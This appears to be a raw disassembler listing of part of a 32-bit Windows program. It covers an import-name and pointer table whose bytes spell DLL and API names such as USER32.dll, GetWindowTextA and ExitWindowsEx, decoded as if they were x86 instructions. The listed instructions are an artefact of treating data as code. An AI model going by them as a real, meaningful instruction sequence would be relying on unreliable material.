  428864:	fs push edi
  428866:	imul   ebp,DWORD PTR [esi+0x64],0x7500776f
  42886d:	add    DWORD PTR [edi+0x65],eax
  428870:	je     0x4288c9
  428872:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428879:	js     0x4288ef
  42887b:	inc    ecx
  42887c:	add    BYTE PTR [eax],al
  42887e:	add    DWORD PTR ds:[edi+0x65],eax
  428882:	je     0x4288d1
  428884:	gs jae 0x4288fa
  428887:	popa   
  428888:	addr16 gs push edi
  42888b:	add    BYTE PTR [ebx],ch
  42888d:	add    dl,BYTE PTR [ebx+0x65]
  428890:	outs   dx,BYTE PTR ds:[esi]
  428891:	fs dec ebp
  428893:	gs jae 0x428909
  428896:	popa   
  428897:	addr16 gs push edi
  42889a:	add    BYTE PTR [eax],al
  42889c:	das    
  42889d:	add    dl,BYTE PTR [ebx+0x65]
  4288a0:	je     0x4288e3
  4288a2:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4288a6:	gs push edi
  4288a8:	imul   ebp,DWORD PTR [esi+0x64],0x400776f
  4288af:	add    dl,BYTE PTR [edx+0x65]
  4288b2:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  4288ba:	popa   
  4288bb:	jae    0x428930
  4288bd:	inc    ebp
  4288be:	js     0x428917
  4288c0:	add    BYTE PTR [eax],al
  4288c2:	and    DWORD PTR [edx],eax
  4288c4:	push   ebx
  4288c5:	outs   dx,BYTE PTR gs:[esi]
  4288c7:	fs inc esp
  4288c9:	ins    BYTE PTR es:[edi],dx
  4288ca:	addr16 dec ecx
  4288cc:	je     0x428933
  4288ce:	ins    DWORD PTR es:[edi],dx
  4288cf:	dec    ebp
  4288d0:	gs jae 0x428946
  4288d3:	popa   
  4288d4:	addr16 gs inc ecx
  4288d7:	add    BYTE PTR ds:0x74654701,bh
  4288dd:	dec    ebp
  4288de:	gs jae 0x428954
  4288e1:	popa   
  4288e2:	addr16 gs push esp
  4288e5:	imul   ebp,DWORD PTR [ebp+0x65],0x1d0000
  4288ec:	inc    ebx
  4288ed:	popa   
  4288ee:	jae    0x428953
  4288f0:	popa   
  4288f1:	fs gs push edi
  4288f4:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4288fb:	add    bh,bl
  4288fd:	add    BYTE PTR [ebp+0x78],al
  428900:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  428908:	jae    0x42894f
  42890a:	js     0x42890c
  42890c:	repnz add DWORD PTR [eax+0x6f],edx
  428910:	jae    0x428986
  428912:	dec    ebp
  428913:	gs jae 0x428989
  428916:	popa   
  428917:	addr16 gs push edi
  42891a:	add    BYTE PTR [eax],al
  42891c:	add    DWORD PTR fs:[edi+0x65],eax
  428920:	je     0x428977
  428922:	jo     0x428988
  428924:	popa   
  428925:	je     0x42898c
  428927:	push   edx
  428928:	outs   dx,BYTE PTR ds:[si]
  42892a:	add    BYTE PTR [eax],al
  42892c:	mov    BYTE PTR [edx],al
  42892e:	push   esp
  42892f:	popa   
  428930:	bound  esp,QWORD PTR [edx+0x65]
  428933:	fs push esp
  428935:	gs js  0x4289ac
  428938:	dec    edi
  428939:	jne    0x4289af
  42893b:	push   edi
  42893c:	add    BYTE PTR [eax],al
  42893e:	test   eax,0x616f4c01
  428943:	fs inc edx
  428945:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb8004170
  42894d:	add    BYTE PTR [edx+esi*2+0x61],al
  428951:	ja     0x4289a6
  428953:	je     0x4289b6
  428955:	je     0x4289bc
  428957:	push   edi
  428958:	add    BYTE PTR [eax],al
  42895a:	ja     0x42895d
  42895c:	inc    edi
  42895d:	gs je  0x4289b7
  428960:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428967:	js     0x4289dd
  428969:	dec    esp
  42896a:	outs   dx,BYTE PTR gs:[esi]
  42896c:	addr16 je 0x4289d7
  42896f:	push   edi
  428970:	add    BYTE PTR [eax],al
  428972:	cmp    BYTE PTR [eax],al
  428974:	inc    ebx
  428975:	push   0x70557261
  42897a:	jo     0x4289e1
  42897c:	jb     0x4289c0
  42897e:	jne    0x4289e6
  428980:	push   di
  428982:	add    BYTE PTR [eax],al
  428984:	daa    
  428985:	add    DWORD PTR [edi+0x65],eax
  428988:	je     0x4289d5
  42898a:	gs jns 0x4289ef
  42898d:	outs   dx,DWORD PTR ds:[esi]
  42898e:	popa   
  42898f:	jb     0x4289f5
  428991:	push   esp
  428992:	jns    0x428a04
  428994:	add    BYTE PTR gs:[ebx+0x1],cl
  428998:	inc    edi
  428999:	gs je  0x4289ec
  42899c:	jb     0x428a0d
  42899e:	jo     0x4289f7
  4289a0:	add    BYTE PTR [eax],al
  4289a2:	dec    ebp
  4289a3:	add    BYTE PTR [ebx+0x6f],al
  4289a6:	jo     0x428a21
  4289a8:	push   edx
  4289a9:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4289ae:	sub    eax,0x61684300
  4289b3:	jb     0x428a03
  4289b5:	gs js  0x428a2c
  4289b8:	push   edi
  4289b9:	add    BYTE PTR [eax+0x43734901],dl
  4289bf:	push   0x6f4c7261
  4289c4:	ja     0x428a2b
  4289c6:	jb     0x428a09
  4289c8:	add    BYTE PTR [eax],al
  4289ca:	sub    BYTE PTR [ecx],al
  4289cc:	inc    edi
  4289cd:	gs je  0x428a1c
  4289d0:	popa   
  4289d1:	jae    0x428a47
  4289d3:	inc    ecx
  4289d4:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4289d8:	gs push eax
  4289da:	outs   dx,DWORD PTR ds:[esi]
  4289db:	jo     0x428a52
  4289dd:	jo     0x4289df
  4289df:	add    BYTE PTR [ebx+0x616f4c01],bh
  4289e5:	fs push ebx
  4289e7:	je     0x428a5b
  4289e9:	imul   ebp,DWORD PTR [esi+0x67],0x16d0041
  4289f0:	inc    edi
  4289f1:	gs je  0x428a4b
  4289f4:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4289fb:	outs   dx,BYTE PTR ds:[esi]
  4289fc:	addr16 push edi
  4289fe:	add    BYTE PTR [eax],al
  428a00:	leave  
  428a01:	add    DWORD PTR [ebp+0x61],ecx
  428a04:	jo     0x428a5d
  428a06:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  428a0d:	imul   ebp,DWORD PTR [esi+0x74],0x350073
  428a14:	inc    ebx
  428a15:	push   0x6f547261
  428a1a:	dec    edi
  428a1b:	gs ins DWORD PTR es:[edi],dx
  428a1d:	push   edi
  428a1e:	add    BYTE PTR [eax],al
  428a20:	push   ebp
  428a21:	push   ebx
  428a22:	inc    ebp
  428a23:	push   edx
  428a24:	xor    esi,DWORD PTR [edx]
  428a26:	cs fs ins BYTE PTR es:[edi],dx
  428a29:	ins    BYTE PTR es:[edi],dx
  428a2a:	add    BYTE PTR [eax],al
  428a2c:	xchg   edx,eax
  428a2d:	add    edx,DWORD PTR [edx+0x74]
  428a30:	ins    BYTE PTR es:[edi],dx
  428a31:	dec    ecx
  428a32:	outs   dx,BYTE PTR ds:[esi]
  428a33:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  428a3b:	jb     0x428aa6
  428a3d:	outs   dx,BYTE PTR ds:[esi]
  428a3e:	add    BYTE PTR [bp+0x74],ch
  428a42:	fs ins BYTE PTR es:[edi],dx
  428a44:	ins    BYTE PTR es:[edi],dx
  428a45:	cs fs ins BYTE PTR es:[edi],dx
  428a48:	ins    BYTE PTR es:[edi],dx
  428a49:	add    BYTE PTR ds:0x74654702,al
  428a4f:	dec    esp
  428a50:	outs   dx,DWORD PTR ds:[esi]
  428a51:	arpl   WORD PTR [ecx+0x6c],sp
  428a54:	gs dec ecx
  428a56:	outs   dx,BYTE PTR ds:[esi]
  428a57:	outs   dx,WORD PTR ds:[esi]
  428a59:	push   edi
  428a5a:	add    BYTE PTR [eax],al
  428a5c:	inc    ebp
  428a5d:	add    al,BYTE PTR [edi+0x65]
  428a60:	je     0x428ab2
  428a62:	jb     0x428ad3
  428a64:	arpl   WORD PTR [ecx+0x64],ax
  428a67:	fs jb  0x428acf
  428a6a:	jae    0x428adf
  428a6c:	add    BYTE PTR [eax],al
  428a6e:	rol    DWORD PTR [eax],cl
  428a70:	inc    ebx
  428a71:	jb     0x428ad8
  428a73:	popa   
  428a74:	je     0x428adb
  428a76:	inc    esi
  428a77:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  428a7f:	outs   dx,BYTE PTR ds:[esi]
  428a80:	addr16 push edi
  428a82:	add    BYTE PTR [eax],al
  428a84:	sub    BYTE PTR [ebx+edx*2],al
  428a87:	gs je  0x428ad2
  428a8a:	popa   
  428a8b:	outs   dx,BYTE PTR ds:[esi]
  428a8c:	fs ins BYTE PTR es:[edi],dx
  428a8e:	gs inc ebx
  428a90:	outs   dx,DWORD PTR ds:[esi]
  428a91:	jne    0x428b01
  428a93:	je     0x428a95
  428a95:	add    ah,bl
  428a97:	add    BYTE PTR [ebx+0x72],al
  428a9a:	gs popa 
  428a9c:	je     0x428b03
  428a9e:	dec    ebp
  428a9f:	popa   
  428aa0:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  428aa8:	pop    DWORD PTR [ecx]
  428aaa:	inc    edi
  428aab:	gs je  0x428aef
  428aae:	je     0x428b1f
  428ab0:	ins    DWORD PTR es:[edi],dx
  428ab1:	dec    esi
  428ab2:	popa   
  428ab3:	ins    DWORD PTR es:[edi],dx
  428ab4:	gs inc ecx
  428ab6:	add    BYTE PTR [eax],al
  428ab8:	pusha  
  428ab9:	add    al,BYTE PTR [edi+0x65]
  428abc:	je     0x428b11
  428abe:	jns    0x428b33
  428ac0:	je     0x428b27
  428ac2:	ins    DWORD PTR es:[edi],dx
  428ac3:	push   edi
  428ac4:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  428acb:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  428ad2:	jns    0x428b15
  428ad4:	add    BYTE PTR [eax],al
  428ad6:	aas    
  428ad7:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  428adb:	fs dec esp
  428add:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  428ae4:	add    BYTE PTR [eax],al
  428ae6:	xchg   ecx,eax
  428ae7:	add    al,BYTE PTR [edi+0x6c]
  428aea:	outs   dx,DWORD PTR ds:[esi]
  428aeb:	bound  esp,QWORD PTR [ecx+0x6c]
  428aee:	inc    ecx
  428aef:	ins    BYTE PTR es:[edi],dx
  428af0:	ins    BYTE PTR es:[edi],dx
  428af1:	outs   dx,DWORD PTR ds:[esi]
  428af2:	arpl   WORD PTR [eax],ax
  428af4:	xchg   edx,eax
  428af5:	add    al,0x56
  428af7:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  428afe:	jne    0x428b65
  428b00:	jb     0x428b7b
  428b02:	add    BYTE PTR [eax],al
  428b04:	test   DWORD PTR [ecx],0x46746547
  428b0a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  428b12:	jb     0x428b15
  428b14:	inc    esi
  428b15:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  428b1c:	jne    0x428b90
  428b1e:	arpl   WORD PTR [ebp+0x57],sp
  428b21:	add    BYTE PTR [eax],bh
  428b23:	add    ecx,DWORD PTR [ebp+0x6f]
  428b26:	jbe    0x428b8d
  428b28:	inc    esi
  428b29:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52037600
  428b31:	popa   
  428b32:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  428b39:	jo     0x428baf
  428b3b:	imul   ebp,DWORD PTR [edi+0x6e],0x1920000
  428b42:	inc    edi
  428b43:	gs je  0x428b88
  428b46:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  428b4d:	jo     0x428bb4
  428b4f:	inc    ecx
  428b50:	add    BYTE PTR [eax],al
  428b52:	and    DWORD PTR [ebx+edx*2],eax
  428b55:	gs je  0x428b9e
  428b58:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  428b60:	bound  esi,QWORD PTR [ebp+0x74]
  428b63:	gs jae 0x428ba7
  428b66:	add    BYTE PTR [eax],al
  428b68:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  428b6c:	jbe    0x428bd3
  428b6e:	inc    esi
  428b6f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xbf004178
  428b77:	add    BYTE PTR [ebx+0x6f],al
  428b7a:	jo     0x428bf5
  428b7c:	inc    esi
  428b7d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x51037100
  428b85:	jne    0x428bec
  428b87:	jb     0x428c02
  428b89:	push   eax
  428b8a:	gs jb  0x428bf3
  428b8d:	outs   dx,DWORD PTR ds:[esi]
  428b8e:	jb     0x428bfd
  428b90:	popa   
  428b91:	outs   dx,BYTE PTR ds:[esi]
  428b92:	arpl   WORD PTR [ebp+0x43],sp
  428b95:	outs   dx,DWORD PTR ds:[esi]
  428b96:	jne    0x428c06
  428b98:	je     0x428bff
  428b9a:	jb     0x428b9c
  428b9c:	sub    DWORD PTR [ebx+edx*2],eax
  428b9f:	gs je  0x428bea
  428ba2:	popa   
  428ba3:	outs   dx,BYTE PTR ds:[esi]
  428ba4:	fs ins BYTE PTR es:[edi],dx
  428ba6:	gs dec ecx
  428ba8:	outs   dx,BYTE PTR ds:[esi]
  428ba9:	outs   dx,WORD PTR ds:[esi]
  428bab:	jb     0x428c1a
  428bad:	popa   
  428bae:	je     0x428c19
  428bb0:	outs   dx,DWORD PTR ds:[esi]
  428bb1:	outs   dx,BYTE PTR ds:[esi]
  428bb2:	add    BYTE PTR [eax],al
  428bb4:	push   ss
  428bb5:	add    DWORD PTR [ebp+0x6e],eax
  428bb8:	je     0x428c1f
  428bba:	jb     0x428bff
  428bbc:	jb     0x428c27
  428bbe:	je     0x428c29
  428bc0:	arpl   WORD PTR [ecx+0x6c],sp
  428bc3:	push   ebx
  428bc4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  428bc9:	outs   dx,BYTE PTR ds:[esi]
  428bca:	add    BYTE PTR [eax],al
  428bcc:	jg     0x428bcf
  428bce:	inc    esi
  428bcf:	outs   dx,DWORD PTR ds:[esi]
  428bd0:	ins    BYTE PTR es:[edi],dx
  428bd1:	fs push ebx
  428bd3:	je     0x428c47
  428bd5:	imul   ebp,DWORD PTR [esi+0x67],0x4dd0057
  428bdc:	ins    BYTE PTR es:[edi],dx
  428bdd:	jae    0x428c53
  428bdf:	jb     0x428c4d
  428be1:	outs   dx,BYTE PTR gs:[esi]
  428be3:	inc    ecx
  428be4:	add    BYTE PTR [eax],al
  428be6:	sahf   
  428be7:	add    DWORD PTR [edi+0x65],eax
  428bea:	je     0x428c2f
  428bec:	outs   dx,DWORD PTR ds:[esi]
  428bed:	ins    DWORD PTR es:[edi],dx
  428bee:	ins    DWORD PTR es:[edi],dx
  428bef:	push   esp
  428bf0:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  428bf7:	add    BYTE PTR [edx+eax*1+0x47],dh
  428bfb:	gs je  0x428c52
  428bfe:	push   0x64616572
  428c03:	push   esp
  428c04:	imul   ebp,DWORD PTR [ebp+0x65],0x4b000073
  428c0b:	inc    ebp
  428c0c:	push   edx
  428c0d:	dec    esi
  428c0e:	inc    ebp
  428c0f:	dec    esp
  428c10:	xor    esi,DWORD PTR [edx]
  428c12:	cs fs ins BYTE PTR es:[edi],dx
  428c15:	ins    BYTE PTR es:[edi],dx
  428c16:	add    BYTE PTR [eax],al
  428c18:	mov    dh,0x1
  428c1a:	push   eax
  428c1b:	outs   dx,DWORD PTR ds:[esi]
  428c1c:	ins    BYTE PTR es:[edi],dx
  428c1d:	jns    0x428c86
  428c1f:	outs   dx,DWORD PTR ds:[esi]
  428c20:	outs   dx,BYTE PTR ds:[esi]
  428c21:	add    BYTE PTR [ecx+eax*1+0x47],ch
  428c25:	gs je  0x428c77
  428c28:	bound  ebp,QWORD PTR [edx+0x65]
  428c2b:	arpl   WORD PTR [edi+edx*2+0x0],si
  428c2f:	add    BYTE PTR [ebx+0x6c654400],dh
  428c35:	gs je  0x428c9d
  428c38:	inc    esp
  428c39:	inc    ebx
  428c3a:	add    BYTE PTR [eax],al
  428c3c:	rol    DWORD PTR [ecx],1
  428c3e:	push   ebx
  428c3f:	gs ins BYTE PTR es:[edi],dx
  428c41:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428c46:	push   0x65
  428c48:	arpl   WORD PTR [eax+eax*1+0x0],si
  428c4c:	jmp    0x428c4f
  428c4e:	push   ebx
  428c4f:	gs je  0x428c9f
  428c52:	popa   
  428c53:	jo     0x428ca2
  428c55:	outs   dx,DWORD PTR ds:[esi]
  428c56:	fs add BYTE PTR gs:[eax],al
  428c5a:	leave  
  428c5b:	add    DWORD PTR [edx+0x6f],edx
  428c5e:	jne    0x428cce
  428c60:	fs push edx
  428c62:	arpl   WORD PTR gs:[eax+eax*1+0x76],si
  428c67:	add    BYTE PTR [edx+0x69],al
  428c6a:	je     0x428cae
  428c6c:	ins    BYTE PTR es:[edi],dx
  428c6d:	je     0x428c6f
  428c6f:	add    BYTE PTR [ebx+0x61655201],bh
  428c75:	ins    BYTE PTR es:[edi],dx
  428c76:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428c7d:	je     0x428cf3
  428c7f:	add    BYTE PTR gs:[eax],al
  428c82:	jge    0x428c85
  428c84:	inc    edi
  428c85:	gs je  0x428cdb
  428c88:	jns    0x428cfd
  428c8a:	je     0x428cf1
  428c8c:	ins    DWORD PTR es:[edi],dx
  428c8d:	push   eax
  428c8e:	popa   
  428c8f:	ins    BYTE PTR es:[edi],dx
  428c90:	gs je  0x428d07
  428c93:	gs push ebp
  428c95:	jae    0x428cfc
  428c97:	add    BYTE PTR [eax+0x74654701],cl
  428c9d:	push   esp
  428c9e:	gs js  0x428d15
  428ca1:	inc    ebp
  428ca2:	js     0x428d18
  428ca4:	outs   dx,BYTE PTR gs:[esi]
  428ca6:	je     0x428cf8
  428ca8:	outs   dx,DWORD PTR ds:[esi]
  428ca9:	imul   ebp,DWORD PTR [esi+0x74],0x1cb0041
  428cb0:	push   ebx
  428cb1:	arpl   WORD PTR [ecx+0x6c],sp
  428cb4:	gs push esi
  428cb6:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  428cbd:	inc    ebp
  428cbe:	js     0x428d34
  428cc0:	inc    ebp
  428cc1:	js     0x428cc3
  428cc3:	add    bh,cl
  428cc5:	add    DWORD PTR [ebx+0x65],edx
  428cc8:	ins    BYTE PTR es:[edi],dx
  428cc9:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428cce:	imul   esi,DWORD PTR [eax+0x52],0xfd006e67
  428cd5:	add    DWORD PTR [ebx+0x65],edx
  428cd8:	je     0x428d2e
  428cda:	gs js  0x428d51
  428cdd:	inc    ebx
  428cde:	outs   dx,DWORD PTR ds:[esi]
  428cdf:	ins    BYTE PTR es:[edi],dx
  428ce0:	outs   dx,DWORD PTR ds:[esi]
  428ce1:	jb     0x428ce3
  428ce3:	add    BYTE PTR [eax+0x74615001],ch
  428ce9:	push   0x65526f54
  428cee:	imul   ebp,DWORD PTR [bx+0x6e],0x810000
  428cf6:	inc    ebx
  428cf7:	outs   dx,DWORD PTR ds:[esi]
  428cf8:	ins    DWORD PTR es:[edi],dx
  428cf9:	bound  ebp,QWORD PTR [ecx+0x6e]
  428cfc:	gs push edx
  428cfe:	outs   dx,BYTE PTR ds:[si]
  428d00:	add    BYTE PTR [eax],al
  428d02:	lods   al,BYTE PTR ds:[esi]
  428d03:	add    BYTE PTR [ebx+0x72],al
  428d06:	gs popa 
  428d08:	je     0x428d6f
  428d0a:	push   edx
  428d0b:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428d10:	outs   dx,BYTE PTR ds:[esi]
  428d11:	dec    ecx
  428d12:	outs   dx,BYTE PTR ds:[esi]
  428d13:	imul   esi,DWORD PTR fs:[edx+0x65],0x9a007463
  428d1b:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428d1f:	gs push esp
  428d21:	outs   dx,DWORD PTR ds:[esi]
  428d22:	add    BYTE PTR [eax],al
  428d24:	mov    ds:0x65724300,al
  428d29:	popa   
  428d2a:	je     0x428d91
  428d2c:	dec    ecx
  428d2d:	inc    ebx
  428d2e:	push   edi
  428d2f:	add    BYTE PTR [ebp+0x63655201],bh
  428d35:	je     0x428d8d
  428d37:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  428d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d3f:	add    BYTE PTR [ebx+0x72],al
  428d42:	gs popa 
  428d44:	je     0x428dab
  428d46:	push   eax
  428d47:	popa   
  428d48:	ins    BYTE PTR es:[edi],dx
  428d49:	gs je  0x428dc0
  428d4c:	add    BYTE PTR gs:[edi+0x44],al
  428d50:	dec    ecx
  428d51:	xor    esi,DWORD PTR [edx]
  428d53:	cs fs ins BYTE PTR es:[edi],dx
  428d56:	ins    BYTE PTR es:[edi],dx
	...
  428d5f:	add    BYTE PTR [edx+0x220],ch
	...
  428d7d:	add    BYTE PTR [eax],al
  428d7f:	add    BYTE PTR [ebx+0x28d],bl
	...
  428d8d:	add    BYTE PTR [eax],al
  428d8f:	add    BYTE PTR [ecx+0x64],ch
  428d92:	js     0x428dfd
  428d94:	outs   dx,DWORD PTR fs:[esi]
  428d96:	arpl   WORD PTR cs:[edi+0x6d],bp
  428d9a:	add    BYTE PTR [ebx+0x65],dl
  428d9d:	je     0x428de0
  428d9f:	outs   dx,BYTE PTR ds:[esi]
  428da0:	arpl   WORD PTR [eax+0x6f],bp
  428da3:	jb     0x428df4
  428da5:	jb     0x428e10
  428da7:	imul   ebp,DWORD PTR [bp+0x61],0x3231406c
  428daf:	add    BYTE PTR [eax],al
  428db1:	add    BYTE PTR [eax],al
  428db3:	add    BYTE PTR [eax],ch
  428db5:	xchg   BYTE PTR [edx],al
  428db7:	add    BYTE PTR [esi+eax*4+0x2],al
  428dbb:	add    BYTE PTR [esi-0x7a],dl
  428dbe:	add    al,BYTE PTR [eax]
  428dc0:	push   0x80000286
  428dc5:	xchg   BYTE PTR [edx],al
  428dc7:	add    BYTE PTR [esi+eax*4-0x7951fffe],dl
  428dce:	add    al,BYTE PTR [eax]
  428dd0:	add    BYTE PTR [eax],al
  428dd2:	add    BYTE PTR [eax],al
  428dd4:	rol    BYTE PTR [esi-0x7911fffe],1
  428dda:	add    al,BYTE PTR [eax]
  428ddc:	cld    
  428ddd:	xchg   BYTE PTR [edx],al
  428ddf:	add    BYTE PTR [edx],cl
  428de1:	xchg   DWORD PTR [edx],eax
  428de3:	add    BYTE PTR [esi],bl
  428de5:	xchg   DWORD PTR [edx],eax
  428de7:	add    BYTE PTR [edi+eax*4],ch
  428dea:	add    al,BYTE PTR [eax]
  428dec:	xchg   DWORD PTR ds:[edx],eax
  428def:	add    BYTE PTR [eax-0x79],dl
  428df2:	add    al,BYTE PTR [eax]
  428df4:	pop    esi
  428df5:	xchg   DWORD PTR [edx],eax
  428df7:	add    BYTE PTR [eax-0x79],dh
  428dfa:	add    al,BYTE PTR [eax]
  428dfc:	add    BYTE PTR [edi-0x786ffffe],0x2
  428e03:	add    BYTE PTR [esi-0x4ffffd79],bl
  428e09:	xchg   DWORD PTR [edx],eax
  428e0b:	add    BYTE PTR [edi+eax*4-0x782dfffe],bh
  428e12:	add    al,BYTE PTR [eax]
  428e14:	in     al,0x87
  428e16:	add    al,BYTE PTR [eax]
  428e18:	test   BYTE PTR [edi-0x77fdfffe],0x2
  428e1f:	add    BYTE PTR [edx],dl
  428e21:	mov    BYTE PTR [edx],al
  428e23:	add    BYTE PTR [edx],ah
  428e25:	mov    BYTE PTR [edx],al
  428e27:	add    BYTE PTR [eax],bh
  428e29:	mov    BYTE PTR [edx],al
  428e2b:	add    BYTE PTR [eax+ecx*4+0x2],al
  428e2f:	add    BYTE PTR [esi-0x78],dl
  428e32:	add    al,BYTE PTR [eax]
  428e34:	ins    BYTE PTR es:[edi],dx
  428e35:	mov    BYTE PTR [edx],al
  428e37:	add    BYTE PTR [esi-0x78],bh
  428e3a:	add    al,BYTE PTR [eax]
  428e3c:	mov    WORD PTR [eax-0x7763fffe],cs
  428e42:	add    al,BYTE PTR [eax]
  428e44:	scas   al,BYTE PTR es:[edi]
  428e45:	mov    BYTE PTR [edx],al
  428e47:	add    dl,al
  428e49:	mov    BYTE PTR [edx],al
  428e4b:	add    al,bl
  428e4d:	mov    BYTE PTR [edx],al
  428e4f:	add    dl,ch
  428e51:	mov    BYTE PTR [edx],al
  428e53:	add    ah,bh
  428e55:	mov    BYTE PTR [edx],al
  428e57:	add    BYTE PTR [ecx+ecx*4],cl
  428e5a:	add    al,BYTE PTR [eax]
  428e5c:	sbb    al,0x89
  428e5e:	add    al,BYTE PTR [eax]
  428e60:	sub    al,0x89
  428e62:	add    al,BYTE PTR [eax]
  428e64:	mov    DWORD PTR ds:[edx],eax
  428e67:	add    BYTE PTR [ecx+ecx*4+0x2],cl
  428e6b:	add    BYTE PTR [edx-0x77],bl
  428e6e:	add    al,BYTE PTR [eax]
  428e70:	jb     0x428dfb
  428e72:	add    al,BYTE PTR [eax]
  428e74:	test   BYTE PTR [ecx-0x7669fffe],cl
  428e7a:	add    al,BYTE PTR [eax]
  428e7c:	mov    ds:0xae000289,al
  428e81:	mov    DWORD PTR [edx],eax
  428e83:	add    BYTE PTR [edx-0x35fffd77],bh
  428e89:	mov    DWORD PTR [edx],eax
  428e8b:	add    al,ah
  428e8d:	mov    DWORD PTR [edx],eax
  428e8f:	add    dh,ch
  428e91:	mov    DWORD PTR [edx],eax
  428e93:	add    BYTE PTR [eax],al
  428e95:	mov    al,BYTE PTR [edx]
  428e97:	add    BYTE PTR [edx],dl
  428e99:	mov    al,BYTE PTR [edx]
  428e9b:	add    BYTE PTR [eax],al
  428e9d:	add    BYTE PTR [eax],al
  428e9f:	add    BYTE PTR [edx+ecx*4],ch
  428ea2:	add    al,BYTE PTR [eax]
  428ea4:	add    BYTE PTR [eax],al
  428ea6:	add    BYTE PTR [eax],al
  428ea8:	dec    edx
  428ea9:	mov    al,BYTE PTR [edx]
  428eab:	add    BYTE PTR [edx+ecx*4+0x2],bl
  428eaf:	add    BYTE PTR [esi-0x76],ch
  428eb2:	add    al,BYTE PTR [eax]
  428eb4:	test   BYTE PTR [edx-0x7569fffe],cl
  428eba:	add    al,BYTE PTR [eax]
  428ebc:	test   al,0x8a
  428ebe:	add    al,BYTE PTR [eax]
  428ec0:	mov    eax,0xd600028a
  428ec5:	mov    al,BYTE PTR [edx]
  428ec7:	add    dh,ah
  428ec9:	mov    al,BYTE PTR [edx]
  428ecb:	add    ah,dh
  428ecd:	mov    al,BYTE PTR [edx]
  428ecf:	add    BYTE PTR [ebx+ecx*4],al
  428ed2:	add    al,BYTE PTR [eax]
  428ed4:	adc    cl,BYTE PTR [ebx-0x74ddfffe]
  428eda:	add    al,BYTE PTR [eax]
  428edc:	mov    eax,DWORD PTR cs:[edx]
  428edf:	add    BYTE PTR [eax-0x75],al
  428ee2:	add    al,BYTE PTR [eax]
  428ee4:	push   edx
  428ee5:	mov    eax,DWORD PTR [edx]
  428ee7:	add    BYTE PTR [eax-0x75],ch
  428eea:	add    al,BYTE PTR [eax]
  428eec:	jbe    0x428e79
  428eee:	add    al,BYTE PTR [eax]
  428ef0:	or     BYTE PTR [ebx-0x7463fffe],0x2
  428ef7:	add    BYTE PTR [ebx+ecx*4-0x7433fffe],dh
  428efe:	add    al,BYTE PTR [eax]
  428f00:	fimul  DWORD PTR [ebx-0x7419fffe]
  428f06:	add    al,BYTE PTR [eax]
  428f08:	clc    
  428f09:	mov    eax,DWORD PTR [edx]
  428f0b:	add    BYTE PTR [eax],al
  428f0d:	add    BYTE PTR [eax],al
  428f0f:	add    BYTE PTR [eax],bl
  428f11:	mov    WORD PTR [edx],es
  428f13:	add    BYTE PTR [edx],ah
  428f15:	mov    WORD PTR [edx],es
  428f17:	add    BYTE PTR [eax],dh
  428f19:	mov    WORD PTR [edx],es
  428f1b:	add    BYTE PTR [esp+ecx*4],bh
  428f1e:	add    al,BYTE PTR [eax]
  428f20:	dec    esp
  428f21:	mov    WORD PTR [edx],es
  428f23:	add    BYTE PTR [edx-0x74],bl
  428f26:	add    al,BYTE PTR [eax]
  428f28:	data16 mov WORD PTR [edx],es
  428f2b:	add    BYTE PTR [eax-0x74],dh
  428f2e:	add    al,BYTE PTR [eax]
  428f30:	or     BYTE PTR [edx+eax*1+0x28c9800],0x0
  428f38:	scas   al,BYTE PTR es:[edi]
  428f39:	mov    WORD PTR [edx],es
  428f3b:	add    ah,al
  428f3d:	mov    WORD PTR [edx],es
  428f3f:	add    ah,dl
  428f41:	mov    WORD PTR [edx],es
  428f43:	add    ah,ah
  428f45:	mov    WORD PTR [edx],es
  428f47:	add    ah,dh
  428f49:	mov    WORD PTR [edx],es
  428f4b:	add    BYTE PTR [edx],al
  428f4d:	lea    eax,[edx]
  428f4f:	add    BYTE PTR [edx],bl
  428f51:	lea    eax,[edx]
  428f53:	add    BYTE PTR [ecx*4-0x72cffffe],ah
  428f5a:	add    al,BYTE PTR [eax]
  428f5c:	lea    eax,ds:[edx]
  428f5f:	add    BYTE PTR [eax],al
  428f61:	add    BYTE PTR [eax],al
	...
